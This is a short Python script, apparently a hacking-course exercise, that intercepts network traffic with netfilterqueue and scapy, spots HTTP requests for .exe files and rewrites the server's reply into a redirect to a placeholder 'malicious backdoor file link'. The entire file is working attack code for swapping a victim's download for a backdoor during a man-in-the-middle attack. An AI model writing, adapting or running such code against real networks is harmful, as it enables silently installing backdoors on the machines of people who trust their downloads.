#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy

req_ack = []
def mod_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.Raw):
        if use_packet[scapy.TCP].dport == 80:
            if ".exe" in use_packet[scapy.Raw].load:
                print("[+] Detected Download .exe file REQUEST...")
                req_ack.append(use_packet[scapy.TCP].ack)
        elif use_packet[scapy.TCP].sport == 80:
            if use_packet[scapy.TCP].seq in req_ack:
                print("[+] HTTP Response for the Download Req...#########")
                req_ack.remove(use_packet[scapy.TCP].seq)

                print("[+] Replacing Download with backdoor...")
                use_packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: [MALICIOUS BACKDOOR FILE LINK]\n\n\n"
                del use_packet[scapy.IP].len
                del use_packet[scapy.IP].chksum
                del use_packet[scapy.TCP].chksum
                packet.set_payload(str(use_packet))
    packet.accept()

queue = netq.NetfilterQueue()
queue.bind(0, mod_packet)
queue.run()